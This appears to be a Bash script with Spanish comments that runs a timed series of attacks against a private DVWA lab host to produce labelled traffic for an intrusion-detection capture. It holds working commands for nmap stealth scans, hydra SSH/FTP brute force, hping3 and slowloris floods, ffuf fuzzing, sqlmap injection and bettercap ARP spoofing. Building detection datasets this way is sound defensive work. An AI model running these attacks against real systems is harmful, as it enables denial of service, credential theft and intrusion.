#!/bin/bash
# ============================================================
# lab_attacks.sh — Ataques de laboratorio agrupados por categoría
# Instala sus propias dependencias y genera sus propios archivos
# (wordlist, sesión DVWA) al arrancar. Cada ataque dura 3 min (180s).
#
# Topología:
#   Atacante (esta máquina): 192.168.1.30
#   Servidor/víctima:        192.168.1.10
#   Cliente:                 192.168.1.20
#   Captura (live_conf.py):  192.168.1.40, vía puerto espejo
#
# USO:
#   ./lab_attacks.sh <categoria>          # instala deps + prepara archivos + ataca
#   ./lab_attacks.sh --sin-setup dos      # salta la instalación (ya la corriste antes)
#   ./lab_attacks.sh setup                # solo instala/prepara, sin atacar
#
# Requiere Debian/Kali (apt-get). Ejecuta como root o con sudo disponible.
# ============================================================

ATACANTE="192.168.1.30"
SERVIDOR="192.168.1.10"
CLIENTE="192.168.1.20"
DURACION=180  # 3 minutos, fijo para todos los ataques

WORDLIST="wordlist_corta.txt"
DIRLIST="/usr/share/wordlists/dirb/common.txt"
DVWA_PATH="dvwa"        # ajusta si tu app no es DVWA o está en otra ruta
COOKIES="cookies_dvwa.txt"
PHPSESSID=""

SUDO=""
if [ "$(id -u)" -ne 0 ]; then
  if command -v sudo &> /dev/null; then SUDO="sudo"; fi
fi

# ============================================================
# INSTALACIÓN DE DEPENDENCIAS
# ============================================================
instalar_dependencias(){
  echo "=============================================="
  echo "[*] Verificando/instalando dependencias"
  echo "=============================================="

  if ! command -v apt-get &> /dev/null; then
    echo "[!] Esto asume Debian/Kali (apt-get). Instala las herramientas a mano y continúa."
    return
  fi

  $SUDO apt-get update -qq

  local paquetes=(nmap hydra hping3 slowhttptest sqlmap bettercap ffuf dirb wordlists curl python3-pip)
  for pkg in "${paquetes[@]}"; do
    if dpkg -s "$pkg" &> /dev/null; then
      echo "  [OK] $pkg"
    else
      echo "  [*] Instalando $pkg..."
      $SUDO apt-get install -y -qq "$pkg" \
        || echo "  [!] No se pudo instalar $pkg -- instálalo a mano si algún ataque lo necesita"
    fi
  done

  # slowloris casi nunca viene empaquetado en apt -- se instala vía pip
  if ! command -v slowloris &> /dev/null; then
    echo "  [*] Instalando slowloris vía pip..."
    pip3 install --break-system-packages -q slowloris 2>/dev/null \
      || pip3 install -q slowloris \
      || echo "  [!] No se pudo instalar slowloris -- instálalo a mano (pip install slowloris)"
  else
    echo "  [OK] slowloris"
  fi

  # ffuf: si el paquete apt no existe en tu versión de Kali, se compila con Go como respaldo
  if ! command -v ffuf &> /dev/null; then
    if command -v go &> /dev/null; then
      echo "  [*] ffuf no se instaló por apt -- compilando con Go..."
      go install github.com/ffuf/ffuf/v2@latest 2>/dev/null
      export PATH="$PATH:$(go env GOPATH 2>/dev/null)/bin"
    else
      echo "  [!] ffuf no disponible y Go tampoco -- instala uno de los dos a mano para la categoría 'fuzzer'"
    fi
  fi

  # rockyou.txt viene comprimido por defecto en Kali
  if [ -f /usr/share/wordlists/rockyou.txt.gz ] && [ ! -f /usr/share/wordlists/rockyou.txt ]; then
    echo "  [*] Descomprimiendo rockyou.txt..."
    $SUDO gunzip -k /usr/share/wordlists/rockyou.txt.gz
  fi

  echo "[+] Dependencias listas."
}

# ============================================================
# ARCHIVOS NECESARIOS PARA LA EJECUCIÓN
# ============================================================
preparar_archivos(){
  echo "=============================================="
  echo "[*] Preparando archivos de la sesión"
  echo "=============================================="

  if [ ! -f "$WORDLIST" ]; then
    if [ -f /usr/share/wordlists/rockyou.txt ]; then
      head -n 200 /usr/share/wordlists/rockyou.txt > "$WORDLIST"
      echo "  [+] $WORDLIST creado (200 palabras de rockyou.txt)"
    else
      printf "admin\npassword\n123456\nmsfadmin\nletmein\nqwerty\nvagrant\ntoor\n" > "$WORDLIST"
      echo "  [!] rockyou.txt no disponible -- $WORDLIST creado con una lista mínima de respaldo"
    fi
  else
    echo "  [OK] $WORDLIST ya existe"
  fi

  preparar_sesion_dvwa
}

preparar_sesion_dvwa(){
  echo "  [*] Intentando iniciar sesión en DVWA (admin/password por defecto)..."
  local token
  token=$(curl -s -c "$COOKIES" "http://$SERVIDOR/$DVWA_PATH/login.php" \
          | grep -oP "user_token'\s*value='\K[^']+")
  if [ -z "$token" ]; then
    echo "  [!] No se pudo leer el formulario de login -- ¿es DVWA y está en /$DVWA_PATH/?"
    echo "      Si tu app es distinta, edita SQLI_COOKIE a mano en cat_webattack()."
    return
  fi
  curl -s -b "$COOKIES" -c "$COOKIES" \
    -d "username=admin&password=password&user_token=${token}&Login=Login" \
    "http://$SERVIDOR/$DVWA_PATH/login.php" > /dev/null
  curl -s -b "$COOKIES" -c "$COOKIES" \
    -d "security=low&seclev_submit=Submit" \
    "http://$SERVIDOR/$DVWA_PATH/security.php" > /dev/null
  PHPSESSID=$(grep PHPSESSID "$COOKIES" 2>/dev/null | awk '{print $NF}')
  if [ -n "$PHPSESSID" ]; then
    echo "  [+] Sesión DVWA iniciada, PHPSESSID=$PHPSESSID, seguridad=low"
  else
    echo "  [!] No se obtuvo PHPSESSID -- revisa/edita SQLI_COOKIE a mano si sqlmap falla"
  fi
}

# ============================================================
# UTILIDADES DE EJECUCIÓN
# ============================================================
pausa(){
  echo ""
  echo "=============================================="
  echo "[*] Siguiente ataque: $1"
  echo "[*] Etiqueta sugerida en live_conf.py: '$2'"
  echo "=============================================="
  read -p "    Cambia la etiqueta allá y presiona ENTER para lanzarlo... "
}

ejecutar_por(){
  # Siempre dura exactamente <segundos>: corta el comando si se pasa,
  # o espera el resto si termina antes (ej. un scan rápido).
  local segundos="$1"; shift
  local inicio
  inicio=$(date +%s)
  echo "[*] Ejecutando (${segundos}s): $*"
  timeout "$segundos" "$@"
  local transcurrido=$(( $(date +%s) - inicio ))
  local restante=$(( segundos - transcurrido ))
  [ "$restante" -gt 0 ] && sleep "$restante"
  echo "[+] Bloque de ${segundos}s completado."
}

recuperacion(){
  echo ""
  echo "[!] Ataque DoS terminado -- verifica que $SERVIDOR se recuperó antes de seguir"
  echo "    (revierte el snapshot de la VM, o confirma con: curl -I http://$SERVIDOR/)"
  read -p "    Presiona ENTER cuando esté recuperado y hayas puesto la etiqueta 'normal'... "
}

# ============================================================
# CATEGORÍAS -- parámetros afinados para que el patrón sea nítido
# ============================================================

# PORTSCAN: alternar T4 (rápido/obvio: ráfaga de conexiones en segundos, dispara
# ct_dst_ltm/ct_srv_dst) con T2 (lento/sigiloso) da variedad de timing real.
cat_portscan(){
  pausa "SYN scan T4 (todos los puertos, rápido)" "portscan"
  ejecutar_por $DURACION nmap -sS -T4 -p- "$SERVIDOR"

  pausa "FIN scan T2 (sigiloso -- Flag Signature=fin_scan)" "portscan"
  ejecutar_por $DURACION nmap -sF -T2 -p- "$SERVIDOR"

  pausa "XMAS scan T2 (Flag Signature=xmas_scan, casi nunca aparece en tráfico normal)" "portscan"
  ejecutar_por $DURACION nmap -sX -T2 -p- "$SERVIDOR"

  pausa "NULL scan T2 (Flag Signature=null_scan)" "portscan"
  ejecutar_por $DURACION nmap -sN -T2 -p- "$SERVIDOR"

  pausa "UDP scan T4" "portscan"
  ejecutar_por $DURACION nmap -sU -T4 --top-ports 200 "$SERVIDOR"

  pausa "Detección de SO/versión de servicios" "portscan"
  ejecutar_por $DURACION nmap -O -sV "$SERVIDOR"
}

# BRUTEFORCE: -t 16 (vs. 4 antes) para una ráfaga densa de intentos repetidos al
# mismo puerto en poco tiempo -- patrón mucho más claro en ct_srv_src/Src Packets.
cat_bruteforce(){
  pausa "Fuerza bruta FTP (16 hilos)" "bruteforce"
  ejecutar_por $DURACION hydra -l msfadmin -P "$WORDLIST" -t 16 ftp://"$SERVIDOR"

  pausa "Fuerza bruta SSH (16 hilos)" "bruteforce"
  ejecutar_por $DURACION hydra -l msfadmin -P "$WORDLIST" -t 16 ssh://"$SERVIDOR"
}

# DOS: --flood ya es el patrón más extremo posible (paquetes/seg al máximo,
# tamaño mínimo, sin completar el handshake) -- no hace falta afinar más.
cat_dos(){
  pausa "SYN flood" "dos"
  ejecutar_por $DURACION hping3 -S -p 80 --flood "$SERVIDOR"
  recuperacion

  pausa "UDP flood" "dos"
  ejecutar_por $DURACION hping3 --udp -p 53 --flood "$SERVIDOR"
  recuperacion

  pausa "ICMP flood" "dos"
  ejecutar_por $DURACION hping3 --icmp --flood "$SERVIDOR"
  recuperacion

  pausa "Slowloris (500 sockets -- más conexiones a medio abrir = patrón más claro)" "dos"
  ejecutar_por $DURACION slowloris "$SERVIDOR" -p 80 -s 500
  recuperacion

  pausa "slowhttptest (500 conexiones)" "dos"
  ejecutar_por $DURACION slowhttptest -c 500 -H -g -o slow_test -i 10 -r 200 -t GET -u http://"$SERVIDOR"/ -x 24
  recuperacion
}

# FUZZER: -t 40 (vs. 20 antes) para maximizar la densidad de rutas distintas
# probadas por segundo contra el mismo host -- patrón claro en ct_dst_ltm/HTTP.
cat_fuzzer(){
  pausa "Fuzzing de rutas/directorios (ffuf, 40 hilos)" "fuzzer"
  ejecutar_por $DURACION ffuf -u "http://$SERVIDOR/FUZZ" -w "$DIRLIST" -t 40
}

# WEBATTACK: --level=3 genera más variantes de payload por parámetro que
# --level=2 -- más intentos distintos en la ventana de 3 min, sin subir --risk
# (que sí podría llegar a modificar datos reales de la app).
cat_webattack(){
  pausa "Inyección SQL (sqlmap, level=3)" "webattack"
  local cookie="security=low; PHPSESSID=${PHPSESSID:-REEMPLAZA_ESTO}"
  ejecutar_por $DURACION sqlmap -u "http://$SERVIDOR/$DVWA_PATH/vulnerabilities/sqli/?id=1&Submit=Submit#" \
    --cookie="$cookie" --batch --level=3
}

cat_mitm(){
  pausa "ARP spoofing" "mitm"
  ejecutar_por $DURACION bettercap -iface eth0 -eval "set arp.spoof.targets $SERVIDOR; arp.spoof on"
  echo "[!] Limpia la caché ARP en el servidor después: ip -s -s neigh flush all"
  echo "[i] Nota: live_conf.py hoy no tiene una feature dedicada para detectar ARP"
  echo "    spoofing (una IP reclamada por varias MAC) -- si te importa esta categoría"
  echo "    en particular, dime y te la agrego."
}

# ============================================================
# MAIN
# ============================================================
SETUP=1
if [ "$1" == "--sin-setup" ]; then
  SETUP=0
  shift
fi

if [ "$SETUP" -eq 1 ]; then
  instalar_dependencias
  preparar_archivos
fi

case "$1" in
  portscan)   cat_portscan ;;
  bruteforce) cat_bruteforce ;;
  dos)        cat_dos ;;
  fuzzer)     cat_fuzzer ;;
  webattack)  cat_webattack ;;
  mitm)       cat_mitm ;;
  setup)      : ;;  # ya se hizo arriba, no ataca nada más
  todo)
    cat_portscan
    cat_bruteforce
    cat_dos
    cat_fuzzer
    cat_webattack
    cat_mitm
    echo ""
    echo "[+] Laboratorio completo. Confirma que la etiqueta quedó en 'normal'."
    ;;
  *)
    echo "Uso: $0 [--sin-setup] <categoria>"
    echo ""
    echo "Categorías (3 min por ataque):"
    echo "  portscan    -- 6 técnicas de nmap                     (~18 min)"
    echo "  bruteforce  -- FTP + SSH con Hydra                    (~6 min)"
    echo "  dos         -- 3 floods + 2 DoS lentos + recuperación (~15 min + pausas)"
    echo "  fuzzer      -- fuzzing de rutas web con ffuf           (~3 min)"
    echo "  webattack   -- inyección SQL con sqlmap                (~3 min)"
    echo "  mitm        -- ARP spoofing con bettercap              (~3 min)"
    echo "  todo        -- las 6 categorías seguidas               (~48 min + tus pausas)"
    echo "  setup       -- solo instala dependencias y prepara archivos, sin atacar"
    ;;
esac
